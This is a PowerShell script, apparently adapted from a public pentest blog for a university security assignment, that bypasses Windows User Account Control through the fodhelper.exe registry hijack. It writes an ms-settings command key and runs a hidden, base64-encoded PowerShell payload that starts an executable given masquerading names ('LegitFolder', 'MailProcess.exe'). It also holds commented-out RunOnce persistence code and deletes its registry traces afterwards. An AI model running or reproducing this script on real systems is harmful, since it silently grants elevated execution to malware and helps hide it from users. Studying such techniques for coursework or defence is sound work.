<#
.SYNOPSIS  
    This script can bypass User Access Control (UAC) via fodhelper.exe
　
    It creates a new registry structure in: "HKCU:\Software\Classes\ms-settings\" to perform UAC bypass and starts 
    an elevated command prompt. 
    　
.NOTES  
    Function   : FodhelperUACBypass
    File Name  : FodhelperUACBypass.ps1 
    Author     : netbiosX. - pentestlab.blog 
　
.LINKS          
    https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692
    https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/    
　
.EXAMPLE  
　
     Load "cmd /c start C:\Windows\System32\cmd.exe" (it's default):
     FodhelperUACBypass 
　
     Load specific application:
     FodhelperUACBypass -program "cmd.exe"
     FodhelperUACBypass -program "cmd.exe /c powershell.exe"　
#>

function FodhelperUACBypass(){ 
 Param (
           
        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe" #default
       )

    #Create Registry Structure
    # # Path to the EXE you want to register
    # $exePath = "C:\Users\Diego Untalan\Uni Code\COMP6841\Assignment\testing\dud.exe"   # adjust as needed

    # # 1) Create (or open) the key
    # $keyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    # New-Item -Path $keyPath -Force | Out-Null          # -Force = create if missing

    # # 2) Set the string value "MailService" to the EXE’s absolute path
    # New-ItemProperty -Path  $keyPath `
    #                 -Name  "MailService" `
    #                 -Value $exePath `
    #                 -PropertyType String `
    #                 -Force | Out-Null

    # # 3) Close‑up – PowerShell cmdlets don’t require an explicit CloseKey call
    # Write-Host "Registry value written successfully."

    # copy C:\Windows\System32\cmd.exe 'C:\Users\Diego Untalan\Desktop\lol.exe'
    
    # Define the registry path
    $registryPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

    # Create the registry key if it doesn't exist
    if (-not (Test-Path $registryPath)) {
        New-Item -Path $registryPath -Force | Out-Null
    }

    $payload = 'powershell -WindowStyle Hidden -EncodedCommand ' + [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Start-Process "C:\Users\Diego Untalan\AppData\Roaming\LegitFolder\MailProcess.exe"'))

    # Set the default value to the desired executable path
    # Set-ItemProperty -Path $registryPath -Name "(default)" -Value '"C:\Users\Diego Untalan\AppData\Roaming\LegitFolder\MailProcess.exe" /c C:\Users\Diego Untalan\Documents\Uni Code\COMP6841\Assignment\6_deployment\mailservice.exe'
    Set-ItemProperty -Path $registryPath -Name "(default)" -Value $payload


    # Optional: Add the DelegateExecute entry to allow bypass of UAC (empty value)
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -PropertyType String -Force

    Start-Sleep 3

    #Start fodhelper.exe
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    Write-Host "works"

    #Cleanup
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

}

FodhelperUACBypass

